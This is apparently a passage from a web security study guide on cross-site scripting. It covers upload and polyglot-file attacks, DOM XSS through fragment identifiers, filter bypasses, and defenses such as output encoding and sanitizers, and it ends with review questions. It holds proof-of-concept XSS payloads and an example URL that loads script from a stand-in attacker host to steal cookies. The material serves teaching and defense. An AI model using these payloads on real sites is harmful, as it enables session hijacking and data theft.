- Applications often fail in *file preview features*, rendering uploaded content in risky DOM contexts.

*Modern Offensive Angle:*

Instead of targeting direct browser rendering:

- Look for *file preview pages* where filenames, image tags, or meta info is reflected unsanitized.

- Abuse *SVG files* with embedded scripts (since SVG is a legit image format but also XML/HTML).

- Test *embedded PDFs* that allow JavaScript or malformed XFA forms.

*TL;DR Exploitation Summary*

- *Bypass extension filtering* through evasion techniques.

- *Analyze download headers:* ```Content-Type```, ```Content-Disposition```, ```X-Content-Type-Options```.

- Attack via *file preview* features or application-specific *rendering logic*.

- Exploiting XSS via file uploads is less about "old school Content-Type sniffing" now and more about *application logic flaws*.

### Hybrid File Attacks:

Modern web applications often validate uploaded files to ensure they conform to expected formats (e.g., verifying magic bytes for images). However, *hybrid files*—crafted to be valid under *two distinct file formats simultaneously*—can be used to bypass these protections and conceal *executable payloads within files masquerading as benign content.*

*The GIFAR Example:*

A classic case of this technique is the *GIFAR (GIF + JAR)* file, introduced by Billy Rios:

- *GIF metadata* (headers) is placed at the *start of the file.*

- *JAR (Java Archive) metadata* is appended at the *end of the file.*

- Both formats are tolerant of extra data; thus, the resulting file can pass as both a *valid image* and a *functional JAR archive.*

*Attack Chain Overview:*

1. Upload Phase:

- The attacker uploads the GIFAR file to a vulnerable function (e.g., profile picture upload).

- The application accepts it, believing it to be a legitimate image.

2. Execution Phase:

- The attacker hosts a page on a third-party site (like a blog).

- The malicious page uses an ```<applet>``` or ```<object>``` tag to *load the GIFAR from the victim site's domain.*

3. Exploitation:

- Due to Java's *origin policy quirks*, the applet is sandboxed within the *domain of the hosting file* (victim site), not the attacker's domain.

- This grants the applet access to session cookies, DOM, and other sensitive data of logged-in users.

4. Session Hijack Complete.

*Current-Day Relevance of GIFAR:*

- Modern browsers and JVM plug-ins have mitigated classic GIFAR exploits.

- The Java plug-in now checks for hybrid content within JAR files.

- Applets themselves are pretty much *deprecated and disabled* across all major browsers.

- HOWEVER—the *concept of hybrid file exploitation is still very much alive*, morphing into new formats and attack vectors.

*Modern Hybrid File Attack Scenarios:*

- *Polyglot Files:* Files that are *valid under multiple interpreters/parsers* (e.g., PDF+JS, ZIP+Image, MP3+HTML). Used to bypass upload filters or content inspection.

- *SVG Files with Embedded JavaScript:* SVG is XML and supports inline ```<script>``` tags—great for XSS payloads.

- *Office Document Malware:* Embedding macros, ActiveX, or malicious OLE objects inside DOCX/XLSX files.

- *HTML Smuggling via Files:* Burying encoded payloads within downloadable files that are decoded and executed in-browser via client-side logic.

- *Content-Type Mismatches:* Uploading a valid PNG file that also has an appended HTML payload which gets processed when opened directly via URL if no proper MIME checks exist.

*Tools for Hybrid File Generation (Kali Linux Arsenal):*

While Kali doesn't have a “GIFAR generator” out-of-the-box anymore, the general concept of hybrid file attacks can be built with:

- Bash & Hex Editors (```xxd```, ```hexedit```): Manually splice together file formats.

- *exiftool:* Edit image metadata to include script payloads.

- *evil-winrm & metasploit:* For embedding payloads in documents/scripts.

- *msfvenom:* Create payloads that could be embedded in file formats like PDFs or Office files.

- *Polyglot Generator Scripts (Python):* Some community tools on GitHub can generate ZIP-Image polyglots, PDF-HTML polyglots, etc.

- *Burp Suite Repeater/Intruder:* For testing upload restrictions and tampering with MIME types post-upload.

- *Ghostscript + ImageMagick Attacks:* Abuse processing engines via hybrid crafted images (although this is more about backend RCE than frontend XSS).

Most modern defenses rely on:

- *Strict MIME-Type enforcement* (```Content-Type```, ```Content-Disposition```, ```X-Content-Type-Options: nosniff```).

- Limiting *inline rendering* of user-uploaded files.

- Backend processing with secure image parsers.

- *Content Security Policy (CSP)* headers to limit script execution from uploaded content.

### XSS in Files Loaded via AJAX:

Modern web applications often use *AJAX (Asynchronous JavaScript and XML)* to *dynamically fetch and render page fragments* without reloading the entire page. One common pattern is using *fragment identifiers (the “#” symbol)* in URLs to indicate what part of the app the client should load:

```
http://wahh-app.com/#profile
```

When a user clicks this link, *JavaScript intercepts the click*, extracts the *“profile”* part after the “#”, fetches the corresponding file via AJAX (like *profile.html*), and injects the retrieved content into an existing *HTML element*, typically a ```<div>```.

A ```<div>``` is a *container element* in HTML used to group blocks of content for styling or scripting purposes. It's often targeted by JavaScript to *dynamically change its contents.* Example:

```
<div id="content"></div>
```

JavaScript can update this using:

```
document.getElementById('content').innerHTML = "<p>New Content</p>";
```

If the application allows users to *upload image files* (profile pictures, attachments, etc.) and serves them via predictable URLs, you can attempt *to embed HTML (or even script tags) into metadata sections of the image file.*

Where to Hide Payloads?

- *EXIF Metadata:* For JPEG files, EXIF allows comments, descriptions, and other text fields—perfect hiding spots.

- *Image Comments Sections:* GIF and PNG formats also allow comment fields.

*Attack Flow:*

1. *Upload a malicious image* (e.g., ```xss.jpg```) with HTML/script payload embedded in EXIF data.

2. Construct a URL to trigger the client-side AJAX loader:

```
http://wahh-app.com/#profiles/images/xss.jpg
```

3. The JavaScript logic sees the *“#profiles/images/xss.jpg”*, fetches the file, and blindly sets its content to:

```
div.innerHTML = [contents of xss.jpg]
```

4. *Browsers like Firefox and Safari* may attempt to render non-image sections as *raw HTML* inside the div.

- The binary parts are ignored/garbled, but your injected HTML *executes as valid DOM elements.*

- Example payload inside image comment:

```
<script>alert('XSS!');</script>
```

*Remote File Inclusion (RFI) via Fragment Identifier:*

Now, let’s take this up a notch using *external attacker-controlled files:*

1. Suppose the app uses:

```
var file = location.hash.substring(1);
fetch(file).then(response => response.text()).then(data => {
    document.getElementById("content").innerHTML = data;
});
```

*Additional Notes: Why is This Code Vulnerable?*

- ```location.hash.substring(1)```:

Takes the URL fragment after ```#``` and uses it as-is.

User-controlled input. Anyone can craft a link like:

```
http://wahh-app.com/#evil-file.html
```

No validation or sanitization is applied here.

- ```fetch(file)```:

The script *blindly fetches* the file from the user-supplied input. If the file points to an external domain (and CORS is permissive), you’re letting attackers serve malicious HTML.

- ```innerHTML``` Injection:

After fetching, the content is dumped into ```innerHTML```. If the fetched content includes:

```
<script>alert('XSS!');</script>
```

it will execute immediately. ```innerHTML``` is dangerous because it parses and renders raw HTML, executing scripts, event handlers, etc.

So, unsanitized user input (from the fragment) is being used to fetch arbitrary content and inject it directly into the DOM via ```innerHTML```.

2. You (attacker) supply a URL like:

```
http://wahh-app.com/#https://evil-attacker.com/malicious.html
```

3. If the app doesn’t *validate that “file” stays within its own domain*, the browser happily performs a *cross-origin fetch* to the attacker’s server.

4. If *CORS (Cross-Origin Resource Sharing)* is allowed on the attacker’s domain for wahh-app.com, the malicious HTML file is fetched and *injected directly into innerHTML*, leading to *DOM-based XSS.*

5. The attacker’s file can contain:

```
<script>stealCookies();</script>
```

*Cross-Origin AJAX (HTML5 CORS Context):*

- In HTML4, browsers enforced strict *same-origin policy*—cross-domain AJAX was blocked.

- With *HTML5 + CORS headers*, a server can explicitly allow cross-origin requests.

- If the *attacker’s domain has a permissive CORS policy* (or misconfigurations on target site allow it), the attack becomes feasible. Example of permissive CORS:

```
Access-Control-Allow-Origin: *
```

*Defensive Implications:*

- Sanitize & validate any fragment identifier usage—never trust URLs derived from ```location.hash```.

- Ensure AJAX requests stay within the intended domain scope.

- Use *Content-Type sniffing protections* (```X-Content-Type-Options: nosniff```).

- Disallow rendering of user-uploaded content as HTML.

- Always sanitize content injected via ```innerHTML```.

## Finding and Exploiting DOM-Based XSS Vulnerabilities:

Unlike reflected XSS, where your payload is sent to the server and reflected back in the response, *DOM-based XSS happens entirely in the browser's JavaScript context.* No server reflection. No visible payload in HTTP responses. That’s why *submitting a unique test string in parameters and watching responses won't reveal DOM XSS bugs* — they never hit the server response body.

### Manual Probing — The Old School First Pass:

You manually tweak URL parameters with payloads like:

```
<script>alert(1)</script>
";alert(1)//
'-alert(1)-'
```

*Goal:* Trick the DOM into placing these payloads into dangerous sinks like ```innerHTML```, ```eval()```, etc.

*Single & Double Quotes?*

If the vulnerable code surrounds your input with quotes:

```
<div class='[USER_INPUT]'></div>
```

you need to *break out of those quotes.* Example:

```
' onmouseover=alert(1) '
```

closes the existing attribute value and injects your payload.

Both single (```'```) and double (```"```) quotes are worth testing depending on how the script builds the DOM elements.

*Limitation of This Manual Clickfest:*

- Not every payload will “fit” syntactically.

- Sometimes you need to terminate a tag or attribute that you don’t even see.

- Static payloads will miss context-sensitive vulnerabilities.

- That’s why a "try all payloads in every place" brute-force scan will still miss lots of DOM XSS vectors.

### Better Method — Reviewing JavaScript Code:

Look for functions/APIs where user input from the DOM can become dangerous:

Source Functions (Where input comes from):

- ```document.location```

- ```document.URL```

- ```document.referrer```

- ```window.location```

Sink Functions (Where data goes and becomes dangerous):

- ```document.write() / writeln()```

- ```element.innerHTML```

- ```eval()```

- ```window.setTimeout() / setInterval()```

- ```window.execScript()```

Best Tool for the Job?

- Burp Suite's DOM Invader (modern, powerful, designed for this task).

- Chrome DevTools Breakpoints (native and lightweight).

- Manual Grep through JS code (because nothing beats the hacker’s eyes).

### Bypassing Server-Side Filters with DOM Tricks:

1. If server filters per-parameter input:

```
http://mdsec.net/error/76/Error.ashx?message=Sorry, an error occurred&foo=<script>alert(1)</script>
```

Server ignores ```foo```, but if the DOM script naively searches for ```message=```, it could “over-read” into your payload.

- Server processes ```message=Sorry, an error occurred```

- DOM script sees: ```message=Sorry, an error occurred&foo=<script>alert(1)</script>```

- Extracts beyond intended boundary and injects your payload.

2. If server filters the entire URL, but not the fragment (```#```):

```
http://mdsec.net/error/82/Error.ashx?message=Sorry, an error occurred#<script>alert(1)</script>
```

- Browser doesn’t send fragment to the server.

- But *JavaScript on the client reads it via ```location.hash``` and injects it into the DOM.*

3. More Sophisticated Parsers:

Some scripts parse up to the next ```&``` or ```#```. So you modify attack vectors:

```
http://mdsec.net/error/79/Error.ashx?foomessage=<script>alert(1)</script>&message=SafeText
http://mdsec.net/error/79/Error.ashx#message=<script>alert(1)</script>
```

Both techniques aim to fool the script's simplistic pattern matching by controlling the first match it finds.

### Debunking Myths:

1. *"We sanitize script tags, so XSS is impossible."*

- Many XSS payloads don’t need ```<script>``` tags.

- Event handlers (```onmouseover=alert(1)```) or inline JS contexts are enough.

- DOM XSS often involves *injecting into existing JS code blocks.*

2. *"Our scanner found nothing, so we are safe."*

- Automated scanners miss DOM-based XSS often.

- DOM-based XSS depends on *dynamic runtime conditions.* Dynamic runtime conditions mean that the vulnerability *only manifests when the page is actively running in the browser*, as it depends on how *JavaScript manipulates the DOM in real-time based on user input, URL fragments, or other environment variables.*

- Unlike reflected XSS, where the payload shows up in the raw HTTP response, DOM XSS might stay hidden in source code or URL parameters until a script *reads, processes, and injects it into the page’s structure during execution.*

- You still need *manual code review, debugging, and creative payload crafting.*

**Modern Tools for DOM XSS Testing:**

- Burp Suite DOM Invader (the king nowadays)

- Chrome DevTools Debugger (built-in)

- XSStrike — a fuzzing tool designed specifically for XSS.

- Manual Grep + Brainstorming = Still Unbeatable.

*Conclusion:*

DOM-based XSS is sneaky because *the vulnerable data flow happens after the page loads, inside JavaScript execution paths.*

*It’s all about following the journey of user-controlled data* — from URL fragments, referrers, or stored DOM elements — and seeing where it lands dangerously.

## Preventing XSS Attacks:

While XSS can manifest in numerous forms—reflected, stored, DOM-based—the core principle behind its prevention remains deceptively simple: *ensure that user-controllable data never gets treated as executable code.*

But in practice? The real battle is *finding every single instance* where untrusted input sneaks into your application’s responses, often hidden in places you’d least expect (like error messages, logs, or minor UI components).
 
Every HTML page in a dynamic web app juggles *dozens of data items* that originate from user input. Without a rigorous approach, it's easy to miss a spot. Hence, XSS remains one of the most persistent plagues, even in apps designed with security in mind.

Since *Reflected and Stored XSS* originate from *server-side mishandling of data*, their defenses focus on *sanitizing inputs and controlling outputs.*

On the other hand, *DOM-based XSS* stems from *client-side JavaScript vulnerabilities*, which demands a different, JS-centric approach (we'll hit that later). For now, let’s dissect how to crush Reflected and Stored XSS.

### Identify All Data Insertion Points:

The first battlefield is awareness. You must map *every spot in your application* where:

1. User-supplied input is reflected back in the HTTP response.

2. Stored user data (from databases, logs, out-of-band channels) is re-inserted into pages.

This requires a *code-level audit*—no automated scanner can fully substitute human scrutiny here. Look for:

- Parameters copied into responses.

- Data inserted into templates.

- Places where user data is rendered in error messages, popups, or logs.

### Validate Input (Sanitize Early):

When data enters your application, enforce *strict validation rules*, customized to the context of each field. For example:

- Names: Letters, certain special characters only.

- Email Addresses: RFC-compliant regex.

- Numeric fields: Enforce numeric-only regex.

- Length Restrictions: Set sane limits (no 10,000 character usernames, please).

Reject anything outside expected norms. But beware! *Input validation is NOT your primary defense against XSS*, it’s just step one.

### Validate Output (Sanitize Late):

This is your true defensive wall. Every time user data is about to be output into a page, you must *contextually encode it:*

- HTML Context: Encode ```<``` to ```&lt;```, ```>``` to ```&gt;```, ```&``` to ```&amp;```, etc.

- Attribute Context: Encode quotes (```"``` and ```'```) and avoid inserting untrusted data into JavaScript event attributes.

- JavaScript Context: Escape backslashes, quotes, and special characters when data is injected into inline scripts.

- URL Context: URL-encode when data ends up in href/src attributes.

*Output encoding must match the context where data is inserted.* A mismatch is a guaranteed failure.

### Eliminate Dangerous Insertion Points:

The safest insertion point is... no insertion point. Refactor your app to avoid ever placing untrusted data into:

- ```<script>``` tags.

- Inline event handlers (```onclick```, ```onmouseover```, etc.).

- Inline styles (to prevent CSS-based XSS).

- Dangerous attributes (like ```srcdoc``` in iframes).

Where possible, prefer using *safe DOM manipulation APIs* like ```textContent``` or templating engines that auto-escape data.

### User-Authored HTML Content:

If your app allows users to input HTML (forums, blogs, rich text editors), apply *HTML sanitization libraries* that:

- Whitelist allowed tags and attributes.

- Strip out ```<script>```, event handlers, ```javascript:``` URIs, etc.

- Rebuild the HTML structure safely.

Examples of such libraries:

- *DOMPurify* (JavaScript)

- *Bleach* (Python)

- *OWASP Java HTML Sanitizer* (Java)

*TL;DR:*

- Identify: Know where user data touches your HTML.

- Validate Input: Be strict. Reject funky data early.

- Encode Output: Contextual escaping is king.

- Minimize Risky Inserts: Don’t place data where code belongs.

- Use Libraries: When dealing with rich content, don’t roll your own sanitizer.

### Validate Output (Sanitize Late, Sanitize Right — Expanded Guide):

Once user-supplied data is about to be echoed back into a web page, the *last line of defense is Output Encoding (aka HTML Encoding).* This ensures that browsers interpret the data *as content*, not executable code.

HTML Encoding converts problematic characters into *safe entities*, so the browser renders them as literal text. For example:

```
| Character | HTML Entity           |
| --------- | --------------------- |
| `"`       | `&quot;`              |
| `'`       | `&#39;` (or `&apos;`) |
| `&`       | `&amp;`               |
| `<`       | `&lt;`                |
| `>`       | `&gt;`                |
```

Additionally, any ASCII character can be encoded using its numeric form:

```
| Character | Numeric Entity |
| --------- | -------------- |
| `%`       | `&#37;`        |
| `*`       | `&#42;`        |
```

**Contextual Quirks — Attribute Injection Danger:**

Encoding *must match the context.* For instance, in *HTML tag attributes*, browsers *decode the attribute value before executing scripts or following links.* So merely encoding ```<``` and ```>``` is *insufficient* if the attribute content can execute code.

*Example: Inadequate Encoding in Attributes*

```
<img src="javascript&#58;alert(document.cookie)">
```

— Which decodes and executes:

```
<img src="javascript:alert(document.cookie)">
```

Another one:

```
<img src="image.gif" onload="alert(&apos;XSS&apos;)">
```

— Which renders as:

```
<img src="image.gif" onload="alert('XSS')">
```

*Moral:* Avoid placing untrusted data in dynamic attribute names, ```src```, ```href```, or inline event handlers unless you absolutely trust your sanitization!

**JavaScript Event Handler Encoding Example:**

If user input lands inside a *JavaScript string* (like an ```onclick``` handler), you need to *escape quotes and backslashes.* Example:

```
<button onclick="doSomething('USERDATA')">Click Me</button>
```

If USERDATA = ```' onmouseover='alert(1)'```, it results in:

```
<button onclick="doSomething('' onmouseover='alert(1)')">Click Me</button>
```

— Boom. XSS. Defense:

- Escape ```'``` as ```\'```

- Escape ```\``` as ```\\```

- HTML encode ```&```, ```<```, ```>```, ```"```, etc.

**Java HTMLEncode Example:**

Here's (the corrected) Java method for HTML encoding:

```
public static String HTMLEncode(String s) {
    StringBuilder out = new StringBuilder();
    for (int i = 0; i < s.length(); i++) {
        char c = s.charAt(i);
        switch(c) {
            case '&': out.append("&amp;"); break;
            case '<': out.append("&lt;"); break;
            case '>': out.append("&gt;"); break;
            case '\"': out.append("&quot;"); break;
            case '\'': out.append("&#39;"); break;
            default:
                if(c > 0x7f) {
                    out.append("&#" + (int) c + ";");
                } else {
                    out.append(c);
                }
        }
    }
    return out.toString();
}
```

*Breakdown:*

```
public static String HTMLEncode(String s) {
    StringBuilder out = new StringBuilder();
```

We're starting a new method called ```HTMLEncode``` which takes a ```String s``` as input.

```StringBuilder``` is used for efficient string concatenation (better than messy ```+``` operations in a loop).

```
    for (int i = 0; i < s.length(); i++) {
        char c = s.charAt(i);
```

We loop through *each character* in the input string. For every iteration, we extract the current character ```c```.

```
        switch(c) {
            case '&': out.append("&amp;"); break;
            case '<': out.append("&lt;"); break;
            case '>': out.append("&gt;"); break;
            case '\"': out.append("&quot;"); break;
            case '\'': out.append("&#39;"); break;
```

Here's the *core HTML encoding block:*

- If ```c``` is an ```&```, replace it with ```&amp;```

- If ```<```, replace with ```&lt;```

- If ```>```, replace with ```&gt;```

- If double-quote ```"```, replace with ```&quot;```

- If single-quote ```'```, replace with ```&#39;```

These are the *primary XSS vector characters.* If not encoded, they let attackers *break out of tags or attributes* and inject malicious scripts.

```
            default:
                if(c > 0x7f) {
                    out.append("&#" + (int) c + ";");
                } else {
                    out.append(c);
                }
        }
```

For *all other characters*, we enter the ```default``` branch:

- If the character code is *above 127 (0x7f)* (meaning it's non-ASCII, like ```ü```, ```ñ```, ```č```), it gets *encoded as a numeric entity* (e.g., ```&#252;``` for ```ü```). Otherwise, it's a safe ASCII character, and we append it as-is.

```
    }
    return out.toString();
}
```

After processing every character, we convert the ```StringBuilder``` back into a ```String``` and return it. This returned string is now *safe to inject into HTML content or attributes* because all risky characters are neutralized.

*What This Function Does In Practice:*

```
| Input String                             | Encoded Output                                                |
| ---------------------------------------- | ------------------------------------------------------------- |
| `Misty & Sage <Hackers>`                 | `Misty &amp; Sage &lt;Hackers&gt;`                            |
| `"XSS' payload<script>alert(1)</script>` | `&quot;XSS&#39; payload&lt;script&gt;alert(1)&lt;/script&gt;` |
```

**Modern Frameworks & Libraries:**

- JavaScript: Use ```textContent``` or ```setAttribute``` instead of ```innerHTML```.

- .NET: ```HttpUtility.HtmlEncode()```

- Java (modern): Use libraries like OWASP Java Encoder.

- Python: ```html.escape()```

- PHP: ```htmlspecialchars()``` with ```ENT_QUOTES``` flag.

Many modern *templating engines auto-escape by default.* Use them properly and avoid turning off auto-escaping.

*Anti-XSS Doctrine Summary:*

1. *HTML-encode output ALWAYS*, especially before inserting user data into the DOM.

2. Ensure *context-sensitive encoding* (HTML content, attributes, JS strings, URLs).

3. Avoid putting untrusted data into dangerous locations (event handlers, script tags).

4. Combine *input validation* and *output encoding* as a dual-layer defense.

5. Canonicalize (normalize) input *before* filtering/encoding. Avoid double-decoding after sanitization.

6. Null bytes? Always validate string length and typecast carefully to avoid bypasses.

### Eliminating Dangerous Insertion Points — Expanded Guide:

There are some areas within an application’s page that are inherently too risky for inserting user-supplied input. Developers should avoid these locations altogether and look for safer ways to implement the same functionality.

One of the most dangerous mistakes is placing user-controllable data directly into JavaScript code — whether inside ```<script>``` tags or as inline event handlers (like ```onclick```, ```onmouseover```, etc.). Even with defensive filters in place, attackers often find clever ways to bypass them. Once they gain control over the script’s execution context, it takes very little effort to inject arbitrary code and execute malicious actions like stealing cookies or hijacking sessions.

Another risky pattern involves embedding user input into *tag attributes that accept URLs.* For example, an attacker might inject a malicious payload using a ```javascript:``` pseudo-protocol:

```
<a href="javascript:alert('XSS')">Click me</a>
```

Avoiding dynamic insertion of user input into these types of attributes is a good rule of thumb.

A subtler but equally dangerous issue arises when attackers can *manipulate the character encoding* used by the browser to interpret the page. Here's how it happens:

- Some applications let users specify the character encoding through request parameters (e.g., ```?charset=utf-7```).

- Others might inject charset information via HTML or headers based on user input.

- If the attacker can control or influence this, they can *bypass otherwise safe filters* by encoding payloads in a way those filters don’t expect.

For instance, your input filter might block ```<script>```, but the attacker sends it encoded in UTF-7, and the browser decodes it *after* your server thinks it’s clean.

*Best Practices to Avoid Charset-based Bypasses:*

- *Always set a fixed character encoding* in your HTTP response headers.

- *Do not allow the client to override this setting*, either via URL parameters or meta tags.

- Ensure your *input and output filters are encoding-aware* and process input *after* canonicalization. Canonicalization is the process of converting data to a standard, normalized form—like resolving ```../```, encoded characters (```%2e%2e/```), or mixed-case paths—so that different inputs that refer to the same resource can be consistently interpreted by the system.

Example of a safe HTTP header:

```
Content-Type: text/html; charset=UTF-8
```

Avoid obscure or outdated encodings like ```ISO-8859-1``` or ```UTF-7```. Stick with ```UTF-8```, which is secure, universal, and well-supported by all modern browsers.

### Allowing Limited HTML:

Some applications need to allow users to submit data in raw HTML format, which will later be inserted into the application's response. A typical example is a blogging platform where users can format their comments using HTML—for bold text, italics, links, images, and so on.

If standard output encoding measures are applied here (like HTML-encoding all user input), they will break the intended functionality. For instance:

If a user submits this HTML (incorrect behavior):

```
<b>Hello, world!</b>
```

…but the application HTML-encodes it before outputting, the response becomes:

```
&lt;b&gt;Hello, world!&lt;/b&gt;
```

…and the user just sees ```<b>Hello, world!</b>``` in the browser instead of seeing **Hello, world!** in bold. This means we can't blindly HTML-encode everything—we need a way to *safely allow only specific HTML elements and attributes,* while blocking dangerous ones.

Securely Supporting Limited HTML:

To do this, developers must take a *whitelist approach*, allowing only specific HTML tags and a limited set of safe attributes. Anything not explicitly allowed is stripped or rejected. This is harder than it sounds, because even simple tags can be misused.

*Exploit Examples:*

Even "safe" tags like ```<b>``` and ```<i>``` can be abused if arbitrary attributes are allowed:

```
<b style="behavior:url(#default#time2)" onbegin="alert(1)">Bolded hack</b>
<i onclick="alert(1)">Click me</i>
```

Similarly, even ```<a>``` with ```href``` might seem safe—until you do this:

```
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click here</a>
```

That base64 string decodes to:

```
<script>alert(1)</script>
```

This turns a clickable link into a silent code execution vector.

*Defense Options:*

1. Use a mature HTML sanitizer framework.

These are purpose-built to handle this exact problem. One well-known example is *OWASP AntiSamy* — a Java library that parses user HTML, removes dangerous parts, and only keeps what your policy allows.

2. Use a safer markup language (like Markdown).

 Instead of allowing raw HTML, accept input in something like Markdown – It's human-friendly, limited, and converts to safe HTML. Example:
 
```
**Hello**, _world_!
```

Would safely render as:

```
<strong>Hello</strong>, <em>world</em>!
```

Markdown parsers typically sanitize output and strip dangerous content unless specifically configured to allow it.

**TL;DR:**

- Never allow raw HTML from users unless you're fully in control of how it's parsed and rendered.

- Whitelisting allowed tags and attributes is mandatory. No blacklist will ever be sufficient.

- Even basic formatting tags can become dangerous with the wrong attributes.

- Consider Markdown or similar safe markup languages as an alternative.

- Always validate and sanitize at render time—not just at input—because storage is not security.

### Preventing DOM-Based XSS:

The defenses we've discussed so far don’t apply directly to *DOM-based XSS* because these attacks exploit vulnerabilities entirely on the client side, not through server-generated responses. That means the server doesn’t even “see” the malicious payload—it's cooked and served right in the browser.

Where possible, *avoid inserting untrusted data from the DOM into the page using JavaScript.* This includes data from sources like:

- ```document.URL```

- ```location.hash```

- ```location.search```

- ```document.referrer```

- Any data controlled by the user agent

These are inherently risky because the attacker can modify them freely. And since they don’t go through the server, traditional defenses like server-side input validation or output encoding are blind to them.

**Defense 1: Validate Input (on the Client Side)**

If you must use data from the DOM, apply strict input validation *before* injecting it anywhere into the page. Here's the example from earlier:

```
<script>
  var a = document.URL;
  a = a.substring(a.indexOf("message=") + 8); // extract the message param value
  a = decodeURIComponent(a);                 // decode %20 etc.

  var regex = /^([A-Za-z0-9\s]+)$/;          // allow only alphanumerics + whitespace

  if (regex.test(a)) {
    document.write(a);                       // output to DOM
  }
</script>
```

Breakdown:

- We extract everything after ```message=``` in the URL.

- Decode it to get the raw string.

- Use a regex to allow only alphanumeric characters and spaces.

- If it passes the check, we output it (though ideally not with ```document.write```, which is outdated and dangerous—see below).

Key point: This client-side validation should be treated as one layer in your defense—not your only shield. An attacker could still bypass it if there's another vulnerable script on the page.

**Defense 2: Validate Input (on the Server Side, Too)**

Even though the DOM-based attack happens in the browser, *the server can still help* by validating incoming requests before they ever reach a vulnerable script. For example, the server can:

- Check that the query string contains only a single parameter

- Verify the parameter is named ```message``` (case-sensitive)

- Ensure the value is alphanumeric (reject ```<```, ```>```, quotes, symbols, etc.)

While this doesn’t block the browser from doing something sketchy, it provides a defense-in-depth barrier—useful especially if you log suspicious behavior or flag weird parameters.

**Defense 3: Sanitize Output (HTML Encode)**

Instead of validating just the input, you can also *encode* it at the point of output. This way, any potentially dangerous content is rendered harmless.

Example Sanitization Function:

```
function sanitize(str) {
  var div = document.createElement('div');
  div.appendChild(document.createTextNode(str));  // safely escape the input
  return div.innerHTML;
}
```

This converts any user-controlled input into a plain-text string, escaping all HTML tags, quotes, and script code. Example:

```
var userInput = '<script>alert(1)</script>';
var safeOutput = sanitize(userInput);
document.body.innerHTML = safeOutput;
// Outputs: &lt;script&gt;alert(1)&lt;/script&gt;
```

Use this approach when you're inserting into ```innerHTML```, ```document.write```, or any dangerous sinks. It’s your last line of defense when validation fails.

*Summary:*

- DOM XSS doesn't go through the server—so it needs *client-side* defenses.

- Always validate and sanitize data from the DOM before inserting it into the page.

- Avoid using ```document.write()``` or ```innerHTML``` directly on unsanitized content.

- Combine *client-side filtering* with *server-side validation* for full coverage.

- Encode all outputs unless you explicitly trust and control the content.

## Review Questions and Closing Notes:

**1. What standard "signature" in an application's behavior can be used to identify most instances of XSS vulnerabilities?**

The classic ```<script>alert(1)</script>``` payload is the universal “canary in the coal mine” for detecting XSS. If it executes, the application is likely vulnerable. Depending on the injection context, alternative payloads such as ```"><img src=x onerror=alert(1)>``` may be needed to bypass filters or restrictions.

**2. You discover a reflected XSS vulnerability within the unauthenticated area of an application's functionality. State two different ways in which the vulnerability could be used to compromise an authenticated session within the application.**

- Session hijacking: Deliver a malicious link to an authenticated victim that exfiltrates their session token.

- Credential harvesting: Inject a fake login prompt to trick the victim into re-entering their credentials.

**3. You discover that the contents of a cookie parameter are copied without any filters or sanitization into the application's response. Can this behavior be used to inject arbitrary JavaScript into the returned page? Can it be exploited to perform an XSS attack against another user?**

Yes. If you can control the cookie’s value, you can inject JavaScript that executes in any session using that cookie. This can be weaponized against other users if you can set their cookie (e.g., via subdomain control, HTTP response manipulation, or direct access).

**4. You discover stored XSS behavior within data that is only ever displayed back to yourself. Does this behavior have any security significance?**

Yes. A “self-only” XSS can still be dangerous if an attacker tricks you into loading the page, potentially leading to privilege escalation, account compromise, or actions executed in your context. If privileged users view the same data, the risk extends to them.
 
**5. You are attacking a web mail application that handles file attachments and displays these in-browser. What common vulnerability should you immediately check for?**

*Content-sniffing / MIME type misinterpretation* — uploading a disguised HTML/JavaScript file (e.g., .jpg that’s really HTML) can lead to stored XSS if displayed inline without the proper ```Content-Disposition: attachment``` and ```X-Content-Type-Options: nosniff``` headers.

**6. How does the same-origin policy impinge upon the use of the Ajax technology XMLHttpRequest?**

The same-origin policy blocks XMLHttpRequest (XHR) calls to different origins unless the target server explicitly allows them via CORS headers. This prevents cross-domain data theft, although some resource-fetching tags like ```<img>```, ```<script>```, and ```<iframe>``` can still make requests without SOP restrictions.

**7. Name three possible attack payloads for XSS exploits (that is, the malicious actions that you can perform within another user's browser, not the methods by which you deliver the attacks).**

- Stealing session cookies and sending them to the attacker.

- Logging keystrokes to capture sensitive input.

- Performing authenticated actions on behalf of the victim (CSRF-style abuse).

**8. You have discovered a reflected XSS vulnerability where you can inject arbitrary data into a single location within the HTML of the returned page. The data inserted is truncated to 50 bytes, but you want to inject a lengthy script. You prefer not to call out to a script on an external server. How can you work around the length limit?**

Use JavaScript string concatenation, encoding tricks, or attributes that trigger code execution with minimal input (```onerror```, ```srcdoc```, etc.) to bootstrap a larger payload from a short initial injection.

**9. You discover a reflected XSS flaw in a request that must use the POST method. What delivery mechanisms are feasible for performing an attack?**

- Host a malicious HTML form that auto-submits via JavaScript to the vulnerable endpoint.

- Use ```fetch()``` or ```XMLHttpRequest``` in a same-origin CSRF exploit.

- Embed the POST form in a hidden ```<iframe>``` and submit it automatically.

*Closing Note:*

XSS hunting isn’t just about finding where ```<script>alert(1)</script>``` works. It’s about reading the application like an unedited diary. Every echo of user input, every unescaped variable, every “that’s probably fine” developer assumption is an invitation to think sideways. The trick is to stop seeing payloads as static strings and start seeing them as keys that reshape the DOM, bend logic flows, and bridge security boundaries. Master the contexts, chain the effects, and XSS stops being a single bug — it becomes an attack language that speaks in the dialect of the target’s own code.

## In Memory of Yuki — 15 / 3 / 2012 – 24 / 7 / 2025

*She was my four-legged, furry friend — my companion, my shooting star, and the gentle heartbeat that pulled me out of bed each morning. This cookbook is dedicated to her, with love that will outlast the stars. ❤️*
